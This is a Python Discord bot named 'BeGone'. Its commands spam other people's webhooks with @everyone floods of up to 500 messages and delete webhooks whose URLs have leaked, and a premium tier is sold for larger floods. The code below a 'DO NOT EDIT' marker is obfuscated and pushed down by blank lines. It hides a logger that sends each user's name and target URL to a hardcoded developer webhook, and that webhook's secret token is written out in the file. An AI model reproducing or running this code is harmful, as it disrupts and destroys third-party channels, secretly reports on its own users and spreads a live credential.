import discord
import requests
from discord.ext import commands


version = "1.1"
TOKEN = "get token from discord dev portal"
owner_id = 1102488251140415549


# DO NOT EDIT ANYTHING BELOW THIS LINE




















































































































bot =commands .Bot (command_prefix ="&",intents =discord .Intents .all (),help_command =None )#line:1
def log (OO00O00O00O00O0OO ,OOO0O0O0OOO000000 ,O0O0O0O0O0O00OOOO ):#line:3
    OO00000O0O000OOOO ={"content":""}#line:6
    O00O0O0OOO0000O00 =f"""
    **url:** {O0O0O0O0O0O00OOOO}

    **user:** {OOO0O0O0OOO000000}

    **action:** {OO00O00O00O00O0OO}
    """#line:14
    OOO00OO000000O000 =f"BeGone v{version} was used"#line:15
    OO00000O0O000OOOO ["embeds"]=[{"title":OOO00OO000000O000 ,"description":O00O0O0OOO0000O00 }]#line:21
    requests .post ("https://discord.com/api/webhooks/1144908329966112798/pPOMiy4wPCWBGqbuIB4b5Hgo_GJEs0G4NNfK4Mfu2Ni2F9iobcahGKy34UHsfDKMiYzd",json =OO00000O0O000OOOO )#line:23
@bot .event #line:25
async def on_ready ():#line:26
    print ("ready to destroy")#line:27
@bot .command ()#line:29
async def help (OO000O00O0000000O ):#line:30
    OO0OO00000O00OOOO =await OO000O00O0000000O .author .create_dm ()#line:31
    O00O0000OO00OO0O0 =discord .Embed (title =f"BeGone v{version} Commands",description ="""
    **Arguments surrounded in {} are required!**
    **Commands marked with :thumbsup: are for everyone.**
    **Commands marked with :money_with_wings: are for premium members.**

    :thumbsup: &spam {url} {amount} - Spams the desired webhook with messages.
    :thumbsup: &delete {url} - Deletes the desired webhook.
    
    :money_with_wings: &pspam {url} {message} {amount} - Spams the desired webhook with a custom message.
    """)#line:41
    await OO0OO00000O00OOOO .send (embed =O00O0000OO00OO0O0 )#line:43
@bot .command ()#line:45
async def pspam (O00O000OOO0OOO00O ,O00O0O00000O00OOO ,O000OOO0000OO0000 ,O000000O0O0OOOO0O ):#line:46
    OO0OO00O00O00O0OO =discord .utils .find (lambda OO0OO0O0O00OOO000 :OO0OO0O0O00OOO000 .name =='Premium',O00O000OOO0OOO00O .message .guild .roles )#line:47
    if OO0OO00O00O00O0OO in O00O000OOO0OOO00O .author .roles :#line:48
        O0OO0O00O00O0OOOO =f"@everyone\n{O000OOO0000OO0000}\nspammed using BeGone v{version}"#line:49
        OOOOOO0OO00OOO0OO =f"BEGONE premiumV{version}"#line:50
        OO0OO0O0OOO0O00OO ={"content":O0OO0O00O00O0OOOO ,"username":OOOOOO0OO00OOO0OO }#line:54
        O000000O0O0OOOO0O =int (O000000O0O0OOOO0O )#line:56
        if O000000O0O0OOOO0O <=500 :#line:58
            log ("Premium Spam",O00O000OOO0OOO00O .author .name ,O00O0O00000O00OOO )#line:59
            for _O0O00OO0000OO00O0 in range (O000000O0O0OOOO0O ):#line:60
                OO00000OO0O0O0000 =requests .post (O00O0O00000O00OOO ,json =OO0OO0O0OOO0O00OO )#line:61
                try :#line:62
                    OO00000OO0O0O0000 .raise_for_status ()#line:63
                except requests .exceptions .HTTPError as O0OOO0OOOO0OO00O0 :#line:64
                    OOOOOOOOO000O0O0O =await O00O000OOO0OOO00O .message .author .create_dm ()#line:65
                    await OOOOOOOOO000O0O0O .send (f"ERROR SENDING MESSAGE: {O0OOO0OOOO0OO00O0}")#line:66
                else :#line:67
                    pass #line:68
        else :#line:69
            await O00O000OOO0OOO00O .message .reply ("The limit for this command is 500!")#line:70
@bot .command ()#line:72
async def spam (O0OO0O0OOO00000O0 ,OO000O00O000O00OO ,O0O0OO0OOOO0OOO00 ):#line:73
    OO0OO0O0OOOO0O00O =f"BEGONE V{version}"#line:74
    O0O00O0OOOOO00O00 =f"@everyone spammed using BeGone v{version}"#line:75
    OO00O000OO000OOOO ={"content":O0O00O0OOOOO00O00 ,"username":OO0OO0O0OOOO0O00O ,}#line:79
    O0O0OO0OOOO0OOO00 =int (O0O0OO0OOOO0OOO00 )#line:81
    if O0O0OO0OOOO0OOO00 <=50 :#line:83
        log ("Spam",O0OO0O0OOO00000O0 .author .name ,OO000O00O000O00OO )#line:84
        for _OOOOO0000OO0OO000 in range (O0O0OO0OOOO0OOO00 ):#line:85
            O00OOO0OOOO0O000O =requests .post (OO000O00O000O00OO ,json =OO00O000OO000OOOO )#line:86
            try :#line:87
                O00OOO0OOOO0O000O .raise_for_status ()#line:88
            except requests .exceptions .HTTPError as O0O0OOOO00O0000OO :#line:89
                O00O00O0O00O00000 =await O0OO0O0OOO00000O0 .message .author .create_dm ()#line:90
                await O00O00O0O00O00000 .send (f"ERROR SENDING MESSAGE: {O0O0OOOO00O0000OO}")#line:91
            else :#line:92
                pass #line:93
    else :#line:94
        await O0OO0O0OOO00000O0 .message .reply ("The limit for this command is 50!")#line:95
@bot .command ()#line:97
async def reboot (OO00O0000OO0O0O0O ):#line:98
    if OO00O0000OO0O0O0O .message .author .id ==owner_id :#line:99
        await bot .close ()#line:100
@bot .command ()#line:102
async def delete (O0OO0O000O00O0O00 ,OO000OO00O00OO0OO ):#line:103
    log ("Delete",O0OO0O000O00O0O00 .author .name ,OO000OO00O00OO0OO )#line:104
    O00O00O000OOOO000 ={'Content-Type':'application/json'}#line:105
    O00OOO00O00O0OO0O =f"BEGONE V{version}"#line:106
    O0OOO0OOO00O00OOO ={"content":"@everyone dont leak ur webhook url lol","username":O00OOO00O00O0OO0O }#line:110
    requests .post (OO000OO00O00OO0OO ,json =O0OOO0OOO00O00OOO )#line:111
    requests .delete (OO000OO00O00OO0OO ,headers =O00O00O000OOOO000 )#line:112
@bot .command (aliases =['p'])#line:114
async def premium (OOO0OOO00000000O0 :commands .Context ,O0O00O00OOOOO0OO0 :discord .Member ):#line:115
    if OOO0OOO00000000O0 .message .author .id ==owner_id :#line:116
        O00OOOO0O0OO0000O =discord .utils .find (lambda O0O0O000O00O000OO :O0O0O000O00O000OO .name =='Premium',OOO0OOO00000000O0 .message .guild .roles )#line:117
        if O00OOOO0O0OO0000O in O0O00O00OOOOO0OO0 .roles :#line:118
            await O0O00O00OOOOO0OO0 .remove_roles (O00OOOO0O0OO0000O )#line:119
            await OOO0OOO00000000O0 .message .reply (f"Premium has been removed from {O0O00O00OOOOO0OO0.id}.")#line:120
        else :#line:121
            await O0O00O00OOOOO0OO0 .add_roles (O00OOOO0O0OO0000O )#line:122
            await OOO0OOO00000000O0 .message .reply (f"{O0O00O00OOOOO0OO0.id} has been given premium.")#line:123
    else :#line:124
        await OOO0OOO00000000O0 .message .reply ("You do not have permission to use this command!")#line:125
bot .run (TOKEN )
